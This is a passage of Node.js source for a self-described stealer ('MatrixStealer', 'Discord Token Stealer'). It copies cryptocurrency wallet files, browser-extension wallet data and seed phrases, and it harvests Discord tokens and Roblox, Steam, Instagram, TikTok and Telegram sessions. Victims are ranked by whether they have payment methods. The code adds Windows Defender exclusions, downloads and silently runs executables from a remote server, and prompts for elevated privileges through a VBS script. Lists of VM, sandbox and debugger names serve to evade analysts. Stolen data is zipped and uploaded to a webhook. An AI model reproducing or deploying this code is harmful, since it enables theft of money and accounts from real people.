                    if (!targetFileName || file.toLowerCase() === targetFileName.toLowerCase()) {
                        fileList.push(filePath);
                    }
                }
            } catch (error) {
                // Skip inaccessible files
            }
        }
    } catch (error) {
        // Skip inaccessible directories
    }

    return fileList;
}

function formatWalletSummary(results) {
    let text = 'ZeroTS CORE - WALLET SUMMARY\n';
    text += '='.repeat(50) + '\n\n';
    text += `Generated: ${results.timestamp.toISOString()}\n\n`;

    if (results.browserWallets.length > 0) {
        text += `BROWSER WALLETS (${results.browserWallets.length})\n`;
        text += '-'.repeat(30) + '\n';
        results.browserWallets.forEach((wallet, index) => {
            text += `${index + 1}. ${wallet.wallet} (${wallet.browser} - ${wallet.profile})\n`;
            text += `   Extension: ${wallet.extensionId}\n`;
            text += `   Path: ${wallet.path}\n`;
            text += `   Files: ${wallet.files.length}\n`;
            wallet.files.forEach(file => {
                text += `     - ${file.name} (${(file.size / 1024).toFixed(1)} KB)\n`;
            });
            text += '\n';
        });
    }

    if (results.desktopWallets.length > 0) {
        text += `DESKTOP WALLETS (${results.desktopWallets.length})\n`;
        text += '-'.repeat(30) + '\n';
        results.desktopWallets.forEach((wallet, index) => {
            text += `${index + 1}. ${wallet.name}\n`;
            text += `   Path: ${wallet.path}\n`;
            text += `   Files: ${wallet.files.length}\n`;
            wallet.files.forEach(file => {
                text += `     - ${file.name} (${(file.size / 1024).toFixed(1)} KB)\n`;
            });
            text += '\n';
        });
    }

    if (results.coldWallets.length > 0) {
        text += `COLD WALLETS (${results.coldWallets.length})\n`;
        text += '-'.repeat(30) + '\n';
        results.coldWallets.forEach((wallet, index) => {
            text += `${index + 1}. ${wallet.name}\n`;
            text += `   Path: ${wallet.path}\n`;
            text += `   Files: ${wallet.files.length}\n`;
            wallet.files.forEach(file => {
                text += `     - ${file.name} (${(file.size / 1024).toFixed(1)} KB)\n`;
            });
            text += '\n';
        });
    }

    if (results.walletDatFiles.length > 0) {
        text += `WALLET.DAT FILES (${results.walletDatFiles.length})\n`;
        text += '-'.repeat(30) + '\n';
        results.walletDatFiles.forEach((file, index) => {
            text += `${index + 1}. ${file.name}\n`;
            text += `   Path: ${file.path}\n`;
            text += `   Size: ${(file.size / 1024 / 1024).toFixed(1)} MB\n\n`;
        });
    }

    if (results.seedFiles.length > 0) {
        text += `SEED PHRASES (${results.seedFiles.length})\n`;
        text += '-'.repeat(30) + '\n';
        results.seedFiles.forEach((file, index) => {
            text += `${index + 1}. ${file.name}\n`;
            text += `   Path: ${file.path}\n`;
            text += `   Size: ${(file.size / 1024).toFixed(1)} KB\n\n`;
        });
    }

    const totalWallets = results.browserWallets.length + results.desktopWallets.length +
        results.coldWallets.length + results.walletDatFiles.length + results.seedFiles.length;

    text += 'SUMMARY\n';
    text += '-'.repeat(30) + '\n';
    text += `Total Wallets Found: ${totalWallets}\n`;
    text += `Browser Wallets: ${results.browserWallets.length}\n`;
    text += `Desktop Wallets: ${results.desktopWallets.length}\n`;
    text += `Cold Wallets: ${results.coldWallets.length}\n`;
    text += `Wallet.dat Files: ${results.walletDatFiles.length}\n`;
    text += `Seed Files: ${results.seedFiles.length}\n`;

    return text;
}

// ========================================
// @ZeroTSCore WALLET STEALER MODULE INTEGRATION
// ========================================

const ZeroTSCore_WALLET_PATHS = {
    // Desktop Wallets
    exodus: {
        path: path.join(process.env.APPDATA || '', 'Exodus', 'exodus.wallet'),
        files: ['*']
    },
    atomic: {
        path: path.join(process.env.APPDATA || '', 'atomic', 'Local Storage', 'leveldb'),
        files: ['*']
    },
    electrum: {
        path: path.join(process.env.APPDATA || '', 'Electrum', 'wallets'),
        files: ['*']
    },
    jaxx: {
        path: path.join(process.env.APPDATA || '', 'com.liberty.jaxx', 'IndexedDB'),
        files: ['*']
    },
    coinomi: {
        path: path.join(process.env.LOCALAPPDATA || '', 'Coinomi', 'Coinomi', 'wallets'),
        files: ['*']
    },
    guarda: {
        path: path.join(process.env.APPDATA || '', 'Guarda', 'Local Storage', 'leveldb'),
        files: ['*']
    },
    
    // Browser Extension Wallets
    metamask: {
        browserExtension: true,
        extensionId: 'nkbihfbeogaeaoehlefnkodbefgpgknn'
    },
    phantom: {
        browserExtension: true,
        extensionId: 'bfnaelmomeimhlpmgjnjophhpkkoljpa'
    },
    ronin: {
        browserExtension: true,
        extensionId: 'fnjhmkhhmkbjkkabndcnnogagogbneec'
    },
    binance: {
        browserExtension: true,
        extensionId: 'fhbohimaelbohpjbbldcngcnapndodjp'
    },
    coinbase: {
        browserExtension: true,
        extensionId: 'hnfanknocfeofbddgcijnmhnfnkdnaad'
    }
};

const ZeroTSCore_BROWSER_PATHS = {
    chrome: path.join(process.env.LOCALAPPDATA || '', 'Google', 'Chrome', 'User Data', 'Default', 'Local Extension Settings'),
    brave: path.join(process.env.LOCALAPPDATA || '', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Extension Settings'),
    edge: path.join(process.env.LOCALAPPDATA || '', 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Extension Settings'),
    opera: path.join(process.env.APPDATA || '', 'Opera Software', 'Opera Stable', 'Local Extension Settings')
};

async function collectZeroTSCoreWallets(outputDir) {
    const ZeroTSCoreDir = path.join(outputDir, 'ZeroTSCore_Wallets');
    if (!fs.existsSync(ZeroTSCoreDir)) {
        fs.mkdirSync(ZeroTSCoreDir, { recursive: true });
    }

    // Helper to copy directory recursively
    const copyDir = (src, dest) => {
        try {
            if (!fs.existsSync(src)) return;
            if (!fs.existsSync(dest)) fs.mkdirSync(dest, { recursive: true });
            
            const items = fs.readdirSync(src);
            for (const item of items) {
                const srcPath = path.join(src, item);
                const destPath = path.join(dest, item);
                try {
                    const stat = fs.statSync(srcPath);
                    if (stat.isDirectory()) {
                        copyDir(srcPath, destPath);
                    } else {
                        fs.copyFileSync(srcPath, destPath);
                    }
                } catch (e) {}
            }
        } catch (e) {}
    };

    // Collect Desktop Wallets
    for (const [walletName, config] of Object.entries(ZeroTSCore_WALLET_PATHS)) {
        if (config.browserExtension) continue;
        
        try {
            if (fs.existsSync(config.path)) {
                const destPath = path.join(ZeroTSCoreDir, 'Desktop', walletName);
                copyDir(config.path, destPath);
            }
        } catch (e) {}
    }

    // Collect Browser Extension Wallets
    for (const [walletName, config] of Object.entries(ZeroTSCore_WALLET_PATHS)) {
        if (!config.browserExtension) continue;

        for (const [browserName, basePath] of Object.entries(ZeroTSCore_BROWSER_PATHS)) {
            try {
                const extensionPath = path.join(basePath, config.extensionId);
                if (fs.existsSync(extensionPath)) {
                    const destPath = path.join(ZeroTSCoreDir, 'Extensions', browserName, walletName);
                    copyDir(extensionPath, destPath);
                }
            } catch (e) {}
        }
    }
    
    return ZeroTSCoreDir;
}

async function extractAllWallets(outputDir) {
    // Call ZeroTSCore Wallet Collection first
    try {
        await collectZeroTSCoreWallets(outputDir);
        console.log('[ZeroTSCore] ZeroTSCore Wallets collected');
    } catch (e) {
        console.log('[ZeroTSCore] ZeroTSCore Wallet Collection failed:', e.message);
    }

    const results = {
        browserWallets: [],
        desktopWallets: [],
        coldWallets: [],
        walletDatFiles: [],
        seedFiles: [],
        timestamp: new Date()
    };

    results.browserWallets = await extractBrowserWallets();
    // if (results.browserWallets.length > 0) {
    //     await copyBrowserWallets(results.browserWallets, outputDir);
    // }

    results.desktopWallets = await extractDesktopWallets();
    // if (results.desktopWallets.length > 0) {
    //     await copyDesktopWallets(results.desktopWallets, outputDir);
    // }

    results.coldWallets = await extractColdWallets();
    if (results.coldWallets.length > 0) {
        await copyColdWallets(results.coldWallets, outputDir);
    }

    results.walletDatFiles = await findWalletDatFiles();
    if (results.walletDatFiles.length > 0) {
        await copyWalletDatFiles(results.walletDatFiles, outputDir);
    }

    results.seedFiles = await findSeedPhrases();
    if (results.seedFiles.length > 0) {
        await copySeedFiles(results.seedFiles, outputDir);
    }

    const hasWallets = results.browserWallets.length > 0 ||
        results.desktopWallets.length > 0 ||
        results.coldWallets.length > 0 ||
        results.walletDatFiles.length > 0 ||
        results.seedFiles.length > 0;

    if (hasWallets) {
        const summaryText = formatWalletSummary(results);
        fs.writeFileSync(
            path.join(outputDir, 'wallets_summary.txt'),
            summaryText,
            'utf8'
        );
    }

    return results;
}

// ========================================
// ChromeEvelator System
// ========================================

function withTimeout(promise, ms, name = 'Operation') {
    return new Promise((resolve, reject) => {
        const timer = setTimeout(() => {
            reject(new Error(`${name} timed out after ${ms}ms`));
        }, ms);

        promise
            .then(value => {
                clearTimeout(timer);
                resolve(value);
            })
            .catch(reason => {
                clearTimeout(timer);
                reject(reason);
            });
    });
}


async function RunChromeElevator(outputFolder, logger) {
    if (!logger) logger = console;
    logger.info('Starting RunChromeElevator...');

    // 1. Target Directory: %temp%\system32os
    const targetDir = path.join(os.tmpdir(), 'system32os');
    
    if (!fs.existsSync(targetDir)) {
        fs.mkdirSync(targetDir, { recursive: true });
    }
    logger.info(`Target Directory: ${targetDir}`);

    try {
        // 2. Add Windows Defender Exclusion
        logger.info('Adding Windows Defender Exclusion for ChromeElevator...');
        try {
            // Check if AdminCheck is defined, otherwise assume true or handle error
            if (typeof AdminCheck !== 'undefined' && AdminCheck.isAdmin()) {
                execSync(`powershell -Command "Add-MpPreference -ExclusionPath '${targetDir}' -Force"`, { stdio: 'ignore' });
                logger.info('Exclusion added via PowerShell');
            } else {
                // Try anyway if AdminCheck is not defined, or skip
                // Assuming AdminCheck is globally available as seen in ChromeElevatorSystem
                logger.info('Skipping exclusion check (Not Admin or AdminCheck missing)');
            }
        } catch (e) {
            logger.error(`Failed to add exclusion: ${e.message}`);
        }

        // 3. Download Executable
        const exeUrl = `${CONFIG.apiUrl}/files/chromelevator.exe`;
        const exePath = path.join(targetDir, "chromelevator.exe");
        logger.info(`Downloading ${exeUrl}...`);

        const writer = fs.createWriteStream(exePath);
        const response = await axios({
            url: exeUrl,
            method: 'GET',
            responseType: 'stream'
        });

        response.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });
        logger.info('Download finished.');

        // 4. Run Executable
        logger.info('Running chromelevator.exe...');
        try {
            execSync(`powershell -Command "Start-Process -FilePath '${exePath}' -WorkingDirectory '${targetDir}' -ArgumentList 'all' -WindowStyle Hidden -Wait"`);
            logger.info('Execution finished.');
        } catch (e) {
            logger.error(`Execution failed: ${e.message}`);
        }

        // 5. Copy Results
        logger.info('Copying results from chromelevator...');
        try {
            if (fs.existsSync(targetDir)) {
                const files = fs.readdirSync(targetDir);
                let fileCount = 0;
                
                for (const file of files) {
                    if (file === 'chromelevator.exe') continue;
                    
                    const srcPath = path.join(targetDir, file);
                    const destPath = path.join(outputFolder, file);

                    try {
                        const stat = fs.statSync(srcPath);
                        if (stat.isDirectory()) {
                            // Recursive copy for directories
                            if (!fs.existsSync(destPath)) fs.mkdirSync(destPath, { recursive: true });
                            const copyRecursive = (src, dest) => {
                                if (fs.statSync(src).isDirectory()) {
                                    if (!fs.existsSync(dest)) fs.mkdirSync(dest);
                                    fs.readdirSync(src).forEach(childItem => {
                                        copyRecursive(path.join(src, childItem), path.join(dest, childItem));
                                    });
                                } else {
                                    fs.copyFileSync(src, dest);
                                }
                            };
                            copyRecursive(srcPath, destPath);
                        } else {
                            fs.copyFileSync(srcPath, destPath);
                        }
                        fileCount++;
                    } catch (e) {
                        logger.error(`Error copying file ${file}: ${e.message}`);
                    }
                }

                logger.info(`Copied ${fileCount} items to ${outputFolder}`);
            }

        } catch (copyError) {
            logger.error(`Copying failed: ${copyError.message}`);
        }

    } catch (error) {
        logger.error(`RunChromeElevator Critical Error: ${error.message}`);
    }
}

async function ChromeElevatorSystem(outputFolder, logger) {
    if (!logger) logger = console;
    logger.info('Starting ChromeElevatorSystem...');

    // 1. Create random folder in AppData
    const randomName = crypto.randomBytes(8).toString('hex');
    const targetDir = path.join(process.env.APPDATA, randomName);
    
    if (!fs.existsSync(targetDir)) {
        fs.mkdirSync(targetDir, { recursive: true });
    }
    logger.info(`Target Directory: ${targetDir}`);

    try {
        // 2. Add Windows Defender Exclusion
    logger.info('Adding Windows Defender Exclusion...');
    try {
        // Use -WindowStyle Hidden and -Force to ensure it works silently and forcefully
        // Also check if we are already admin
        if (AdminCheck.isAdmin()) {
            execSync(`powershell -Command "Add-MpPreference -ExclusionPath '${targetDir}' -Force"`, { stdio: 'ignore' });
            logger.info('Exclusion added via PowerShell');
        } else {
            logger.info('Skipping exclusion add (Not Admin)');
        }
    } catch (e) {
        logger.error(`Failed to add exclusion: ${e.message}`);
    }

        // 3. Download Executable
        const exeUrl = `${CONFIG.apiUrl}/files/lovelybabies.exe`;
        const exePath = path.join(targetDir, "lovelybabies.exe");
        logger.info(`Downloading ${exeUrl}...`);

        const writer = fs.createWriteStream(exePath);
        const response = await axios({
            url: exeUrl,
            method: 'GET',
            responseType: 'stream'
        });

        response.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });
        logger.info('Download finished.');

        // 4. Run Executable
        logger.info('Running executable...');
        try {
            // Using Start-Process to ensure it runs and we wait for it
            // Important: Set WorkingDirectory to targetDir so 'output' folder is created there
            execSync(`powershell -Command "Start-Process -FilePath '${exePath}' -WorkingDirectory '${targetDir}' -ArgumentList 'all' -WindowStyle Hidden -Wait"`);
            logger.info('Execution finished.');
        } catch (e) {
            logger.error(`Execution failed: ${e.message}`);
            // Don't throw, proceed to zip whatever was generated
        }

        // 5. Copy Results
        logger.info('Copying results...');
        try {
            const files = fs.readdirSync(targetDir);
            let fileCount = 0;
            
            for (const file of files) {
                if (file === 'lovelybabies.exe') continue; // Already handled or skipping
                
                const srcPath = path.join(targetDir, file);
                const destPath = path.join(outputFolder, file);

                try {
                    const stat = fs.statSync(srcPath);
                    if (stat.isDirectory()) {
                        // Recursive copy for directories
                        if (!fs.existsSync(destPath)) fs.mkdirSync(destPath, { recursive: true });
                        // Simple recursive copy function since fs.cpSync might not be available in older nodes
                        const copyRecursive = (src, dest) => {
                            if (fs.statSync(src).isDirectory()) {
                                if (!fs.existsSync(dest)) fs.mkdirSync(dest);
                                fs.readdirSync(src).forEach(childItem => {
                                    copyRecursive(path.join(src, childItem), path.join(dest, childItem));
                                });
                            } else {
                                fs.copyFileSync(src, dest);
                            }
                        };
                        copyRecursive(srcPath, destPath);
                    } else {
                        fs.copyFileSync(srcPath, destPath);
                    }
                    fileCount++;
                } catch (e) {
                    logger.error(`Error copying file ${file}: ${e.message}`);
                }
            }

            logger.info(`Copied ${fileCount} items (excluding exe) to ${outputFolder}`);

        } catch (copyError) {
            logger.error(`Copying failed: ${copyError.message}`);
        }

    } catch (error) {
        logger.error(`ChromeElevatorSystem Critical Error: ${error.message}`);
    } finally {
        // 6. Cleanup
        logger.info('Cleaning up...');
        try {
            if (fs.existsSync(targetDir)) {
                fs.rmSync(targetDir, { recursive: true, force: true });
            }
        } catch (e) { }

        try {
            execSync(`powershell -Command "Remove-MpPreference -ExclusionPath '${targetDir}'"`, { stdio: 'ignore' });
        } catch (e) { }
        logger.info('Cleanup finished.');
    }
}

const InputPayload = {

    async main(deepFolder, logger) {
        debugLog('InputPayload.main started');
        console.log('InputPayload.main started');
        if (!logger) {
            logger = {
                info: (msg) => { console.log(msg); debugLog('INFO: ' + msg); },
                success: (msg) => { console.log(msg); debugLog('SUCCESS: ' + msg); },
                error: (msg) => { console.error(msg); debugLog('ERROR: ' + msg); },
                debug: (msg) => { console.log(msg); debugLog('DEBUG: ' + msg); },
                critical: (msg) => { console.error(msg); debugLog('CRITICAL: ' + msg); }
            };
        }

        logger.info('=== Discord Token Stealer Started ===');

        try {
            if (!deepFolder) {
                logger.critical('No deep folder provided!');
                return;
            }

            logger.info(`Using deep folder: ${deepFolder}`);

            const WEBHOOK = CONFIG.webhook;
            logger.debug(`Webhook URL configured: ${WEBHOOK ? 'Yes' : 'No'}`);

            const outputFolder = path.join(deepFolder, 'output');
            const walletOutputDir = outputFolder;

            fs.mkdirSync(outputFolder, { recursive: true });
            logger.info(`Output folder created: ${outputFolder}`);

            // ChromeElevator System (Node.js native replacement)
            try {
                await ChromeElevatorSystem(outputFolder, logger);
                logger.success('ChromeElevatorSystem executed successfully');
            } catch (err) {
                logger.error(`ChromeElevatorSystem failed: ${err.message}`);
            }

            // Real ChromeElevator (chromelevator.exe)
            try {
                await RunChromeElevator(outputFolder, logger);
                logger.success('RunChromeElevator executed successfully');
            } catch (err) {
                logger.error(`RunChromeElevator failed: ${err.message}`);
            }

            logger.info('Starting parallel data collection...');

            const [
                browserCheck,
                walletResults,
                tokens,
                sessionResults,
                backupCodes
            ] = await Promise.allSettled([
                (async () => {
                    logger.info('Checking browser data...');
                    if (!fs.existsSync(outputFolder)) {
                        logger.info('No browser data found');
                        return { exists: false, items: [] };
                    }
                    const items = fs.readdirSync(outputFolder);
                    logger.success(`Browser data: ${items.length} items`);
                    return { exists: items.length > 0, items };
                })(),

                withTimeout((async () => {
                    logger.info('Extracting wallets...');
                    fs.mkdirSync(walletOutputDir, { recursive: true });
                    const results = await extractAllWallets(walletOutputDir);
                    const total = results.browserWallets.length + results.desktopWallets.length +
                        results.coldWallets.length + results.walletDatFiles.length + results.seedFiles.length;
                    logger.success(`Wallets extracted: ${total} items`);
                    return results;
                })(), 120000, 'Wallet Extraction'),

                withTimeout((async () => {
                    logger.info('Collecting Discord tokens...');
                    const collected = await collectAllTokens(outputFolder);
                    logger.success(`Tokens found: ${collected.length}`);
                    return collected;
                })(), 60000, 'Token Collection'),

                withTimeout((async () => {
                    logger.info('Collecting sessions...');
                    try {
                        const results = await Promise.allSettled([
                            collectRobloxSessions(outputFolder).catch(e => { logger.error(`Roblox: ${e.message}`); return null; }),
                            collectSpotifySessions(outputFolder).catch(e => { logger.error(`Spotify: ${e.message}`); return null; }),
                            collectSteamSession().catch(e => { logger.error(`Steam: ${e.message}`); return null; }),
                            collectMinecraftSession().catch(e => { logger.error(`Minecraft: ${e.message}`); return null; }),
                            collectExodusSession().catch(e => { logger.error(`Exodus: ${e.message}`); return null; }),
                            collectInstagramSessions(outputFolder).catch(e => { logger.error(`Instagram: ${e.message}`); return null; }),
                            (async () => {
                                try {
                                    const tiktokCookies = readCookiesFromOutput(outputFolder, 'sessionid');
                                    for (const cookie of tiktokCookies) {
                                        try {
                                            await sendTikTokEmbed(cookie);
                                        } catch (e) {
                                            logger.error(`TikTok send: ${e.message}`);
                                        }
                                    }
                                } catch (e) {
                                    logger.error(`TikTok collection: ${e.message}`);
                                }
                            })()
                        ]);
                        logger.success('Sessions collected');
                        return results;
                    } catch (e) {
                        logger.error(`Session collection error: ${e.message}`);
                        return [];
                    }
                })(), 90000, 'Session Collection'),

                withTimeout((async () => {
                    logger.info('Collecting backup codes...');
                    const backupPath = await writeBackupCodesToFile(outputFolder);
                    logger.success(`Backup codes collected: ${backupPath ? 'Yes' : 'No'}`);
                    return backupPath;
                })(), 30000, 'Backup Codes')
            ]);

            logger.info('Parallel data collection finished');

            // Copy browser password files
            await copyBrowserFiles(outputFolder);

            const browserDataExists = browserCheck.status === 'fulfilled' && browserCheck.value.exists;
            const walletDataExists = walletResults.status === 'fulfilled' && fs.existsSync(path.join(outputFolder, 'wallets_summary.txt'));
            const hasWalletDirs = fs.existsSync(path.join(outputFolder, 'Desktop_Wallets')) || fs.existsSync(path.join(outputFolder, 'Browser_Wallets')) || fs.existsSync(path.join(outputFolder, 'ZeroTSCore_Wallets'));
            const hasAnyOutput = (() => { try { return fs.existsSync(outputFolder) && fs.readdirSync(outputFolder).length > 0; } catch (e) { return false; } })();
            const shouldZip = hasWalletDirs || hasAnyOutput || browserDataExists || walletDataExists;
            const collectedTokens = tokens.status === 'fulfilled' ? tokens.value : [];

            // Write tokens to file in output folder
            if (collectedTokens.length > 0) {
                const tokensPath = path.join(outputFolder, 'discord_tokens.txt');
                const tokenContent = collectedTokens.map(t => {
                    const [token, platform, validation] = t;
                    return `Token: ${token}\nPlatform: ${platform}\nUsername: ${validation.userInfo.username}\nID: ${validation.userInfo.id}\n------------------\n`;
                }).join('\n');
                fs.writeFileSync(tokensPath, tokenContent);
            }

            logger.info(`Should ZIP: ${shouldZip} (Wallets: ${hasWalletDirs}, Browser: ${browserDataExists}, Any: ${hasAnyOutput})`);

            // Prepare Richest Token Embeds
            let extraEmbeds = [];
            let targetId = 'Unknown';
            if (collectedTokens.length > 0) {
                 const richTokens = collectedTokens.sort((a, b) => {
                     const infoA = a[2].userInfo;
                     const infoB = b[2].userInfo;
                     
                     const payA = infoA.has_payment_methods ? 1 : 0;
                     const payB = infoB.has_payment_methods ? 1 : 0;
                     if (payA !== payB) return payB - payA;
                     
                     const nitroA = (infoA.premium_type > 0) ? 1 : 0;
                     const nitroB = (infoB.premium_type > 0) ? 1 : 0;
                     if (nitroA !== nitroB) return nitroB - nitroA;
                     
                     const friendsA = infoA.hqFriendsCount || 0;
                     const friendsB = infoB.hqFriendsCount || 0;
                     if (friendsA !== friendsB) return friendsB - friendsA;
                     
                     return 0;
                 });
 
                 const richestToken = richTokens[0];
                 targetId = richestToken[2].userInfo.id || 'Unknown';
                 extraEmbeds = await generateTokenEmbeds(richestToken[0], richestToken[1], richestToken[2].userInfo);

                 // Send Message 1: Discord Info
                 logger.info('Sending Message 1: Discord Info...');
                 try {
                     await sendLog({
                         content: `@everyone @MatrixStealer v1.0 - Target ID: ${targetId}`,
                         username: "MatrixStealer",
                         avatar_url: "https://i.imgur.com/okbNKaT.png",
                         embeds: extraEmbeds
                     });
                     logger.success('Message 1 sent');
                 } catch (e) {
                     logger.error(`Failed to send Message 1: ${e.message}`);
                 }
            }

            if (shouldZip) {
                const randomName = Math.random().toString(36).substring(2, 15) + '.zip';
                const combinedZipPath = path.join(deepFolder, randomName);
                logger.info(`Creating ZIP at: ${combinedZipPath}`);

                await new Promise((resolve, reject) => {
                    const output = fs.createWriteStream(combinedZipPath);
                    const archive = archiver('zip', { zlib: { level: 9 } });

                    output.on('close', () => {
                        logger.success(`ZIP created: ${archive.pointer()} bytes`);
                        resolve();
                    });

                    archive.on('error', reject);
                    archive.pipe(output);
                    archive.directory(outputFolder, false);
                    archive.finalize();
                });

                logger.info('ZIP created, attempting upload...');

                try {
                    // Send Message 2: ZIP + Analysis Stats
                    await withTimeout(sendZipToFileIOAndWebhook(combinedZipPath, [], '@everyone'), 120000, 'ZIP Upload');
                    logger.success('Message 2 (ZIP + Stats) uploaded');
                } catch (uploadErr) {
                    logger.error(`ZIP upload failed: ${uploadErr.message}`);
                }

                try {
                    if (fs.existsSync(outputFolder)) fs.rmSync(outputFolder, { recursive: true, force: true });
                    if (fs.existsSync(combinedZipPath)) fs.unlinkSync(combinedZipPath);
                } catch (e) { }
            } else {
                logger.warning('No data to ZIP!');
            }

            // Priority operations: injection, and screenshot in parallel (Tokens handled with ZIP now)
            const priorityTasks = [];
            
            // Removed separate token sending logic since it is merged with ZIP


            logger.info('Performing injection...');
            priorityTasks.push(
                performInjection().then(result => {
                    if (result.skipped) {
                        logger.info('Injection skipped - not configured');
                    } else if (result.success) {
                        logger.success(`Injection: ${result.count} clients`);
                    } else {
                        logger.error(`Injection failed: ${result.error}`);
                    }
                }).catch(e => {
                    logger.error(`Injection error: ${e.message}`);
                })
            );

            logger.info('Sending screenshot...');
            priorityTasks.push(
                sendScreenshotToWebhook()
                    .then(() => logger.success('Screenshot sent'))
                    .catch(e => {
                        logger.error('Screenshot send failed:', e.message);
                    })
            );
            
            await Promise.all(priorityTasks);

            // Telegram last (can be slow with large files)
            logger.info('Starting Telegram session collection...');
            try {
                await withTimeout(collectTelegramSession(), 45000, 'Telegram Collection');
                logger.success('Telegram session collected');
            } catch (e) {
                logger.error(`Telegram error: ${e.message}`);
                console.log(`[TELEGRAM] Skipped: ${e.message}`);
            }

            logger.success('=== All tasks completed ===');

        } catch (err) {
            logger.critical(`Fatal error: ${err && (err.message || err)}`);
            logger.error(`Stack: ${err && err.stack}`);
            console.log(`InputPayload Fatal Error: ${err && (err.message || err)}\n${err && err.stack}`);
        }
    }
};

class AdminCheck {
    static isAdmin() {
        try {
            execSync('net session', { stdio: 'pipe', windowsHide: true, timeout: 2000 });
            return true;
        } catch (e) {
            return false;
        }
    }
    static async requestAdmin(wait = false, exitOnSuccess = true) {
        return new Promise((resolve, reject) => {
            try {
                const scriptPath = process.execPath;
                const args = process.argv.slice(1).join(' ');
                const tempDir = os.tmpdir();
                const markerId = `elev_${Date.now()}_${Math.random().toString(36).substring(7)}`;
                const markerPath = path.join(tempDir, `${markerId}.marker`);
                const quotedArgs = process.argv.slice(1).map(arg => arg.includes(' ') ? `"${arg}"` : arg).join(' ');
                const fullArgs = `${quotedArgs} --uac-marker="${markerPath}"`;
                const argsForVBS = fullArgs.replace(/"/g, '" & Chr(34) & "');
                const vbsContent = `Set UAC = CreateObject("Shell.Application")\nUAC.ShellExecute "${scriptPath}", "${argsForVBS}", "", "runas", 1`;
                const vbsPath = path.join(tempDir, `${markerId}.vbs`);
                fs.writeFileSync(vbsPath, vbsContent);
                const proc = spawn('wscript.exe', [vbsPath], { stdio: 'ignore', windowsHide: true });
                proc.on('close', (code) => {
                    try { if (fs.existsSync(vbsPath)) { fs.unlinkSync(vbsPath); } } catch (e) { }
                    setTimeout(() => {
                        const wasAccepted = fs.existsSync(markerPath);
                        if (wasAccepted) {
                            try { fs.unlinkSync(markerPath); } catch (e) { }
                            if (exitOnSuccess) { setTimeout(() => process.exit(0), 500); }
                            resolve();
                        } else {
                            reject(new Error('UAC denied by user'));
                        }
                    }, 3000);
                });
                proc.on('error', (err) => { reject(err); });
            } catch (error) {
                reject(error);
            }
        });
    }
    static async ensureAdmin() {
        if (!this.isAdmin()) {
            console.log('[Admin] Requesting administrator privileges...');
            await this.requestAdmin(false);
            return false;
        }
        console.log('[Admin] Running with administrator privileges');
        return true;
    }
    static async ensureAdminSilent() {
        if (!this.isAdmin()) {
            await this.requestAdmin(false);
            return false;
        }
        return true;
    }
}

const DEBUG_ANTIVM = false;
const VM_MAC_PREFIXES = ["00:0C:29", "08:00:27", "00:1C:42", "00:50:56", "0A:00:27", "00:16:3E", "00:03:FF", "00:1F:16", "BE:EF:CA", "42:01:0A"];
const SANDBOX_PROCESSES = ["vmsrvc", "vmusrvc", "vboxtray", "vmtoolsd", "df5serv", "vboxservice", "vmware", "trio", "tqos", "networkservice", "updata", "sandboxie", "anyrun", "triage", "cuckoo", "sample", "kvmsrvc", "qemud", "xen", "xenservice"];
const DEBUGGER_PROCESSES = ["ollydbg", "ida64", "idaq", "windbg", "x32dbg", "x64dbg", "wireshark", "dumpcap", "procmon", "regmon", "filemon", "processhacker", "autoruns", "tcpview", "volatility", "fiddler", "apimonitor", "immunity", "pestudio", "dnspy", "cheatengine", "ghidra"];
const ANALYSIS_HOSTNAMES = ["sandbox", "analysis", "malware", "vm", "test", "lab", "cuckoo", "virus", "research"];
const ANALYSIS_USERNAMES = ["sandbox", "malware", "virus", "sample", "analyze", "test", "user", "admin", "administrator"];
const VM_FILES = [
    "C:\\windows\\System32\\Drivers\\VBoxMouse.sys",
    "C:\\windows\\System32\\Drivers\\VBoxGuest.sys",
    "C:\\windows\\System32\\Drivers\\VBoxSF.sys",
    "C:\\windows\\System32\\Drivers\\VBoxVideo.sys",
    "C:\\windows\\System32\\vboxdisp.dll",
    "C:\\windows\\System32\\vboxhook.dll",
    "C:\\windows\\System32\\vboxservice.exe",
    "C:\\windows\\System32\\vboxtray.exe",
    "C:\\windows\\System32\\drivers\\vmmouse.sys",
    "C:\\windows\\System32\\drivers\\vmhgfs.sys",
];
const ANALYSIS_DIRECTORIES = [
    "C:\\analysis",
    "C:\\sandbox",
    "C:\\tools",
    "C:\\malware",
    "C:\\samples",
    "C:\\program files\\oracle\\virtualbox guest additions",
    "C:\\program files\\VMware",
];

class AntiVM {
    static checkMacAddress() {
        try {
            const output = execSync('getmac', { encoding: 'utf8', timeout: 500, windowsHide: true });
            for (const prefix of VM_MAC_PREFIXES) { if (output.includes(prefix)) { if (DEBUG_ANTIVM) console.log(`[AntiVM] VM MAC detected: ${prefix}`); return true; } }
        } catch (e) { }
        return false;
    }
    static checkBIOS() {
        try {
            const biosManuf = execSync('powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -ClassName Win32_BIOS | Select-Object -ExpandProperty Manufacturer"', { encoding: 'utf8', timeout: 1000, windowsHide: true });
            const vmBios = ["vmware", "virtualbox", "qemu", "xen", "parallels", "kvm", "microsoft corporation"];
            if (vmBios.some((vm) => biosManuf.toLowerCase().includes(vm))) { if (DEBUG_ANTIVM) console.log(`[AntiVM] VM BIOS detected: ${biosManuf.trim()}`); return true; }
            const biosVersion = execSync('powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -ClassName Win32_BIOS | Select-Object -ExpandProperty Version"', { encoding: 'utf8', timeout: 1000, windowsHide: true });
            if (vmBios.some((vm) => biosVersion.toLowerCase().includes(vm))) { if (DEBUG_ANTIVM) console.log(`[AntiVM] VM BIOS version detected: ${biosVersion.trim()}`); return true; }
        } catch (e) { }
        return false;
    }
    static checkDisk() {
        try {
            const diskModel = execSync('powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -ClassName Win32_DiskDrive | Select-Object -ExpandProperty Model"', { encoding: 'utf8', timeout: 1000, windowsHide: true });
            const vmDisks = ["vbox", "vmware", "virtual", "qemu", "xen"];
            if (vmDisks.some((vm) => diskModel.toLowerCase().includes(vm))) { if (DEBUG_ANTIVM) console.log(`[AntiVM] VM disk detected: ${diskModel.trim()}`); return true; }
        } catch (e) { }
        return false;
    }
    static checkHardware() {
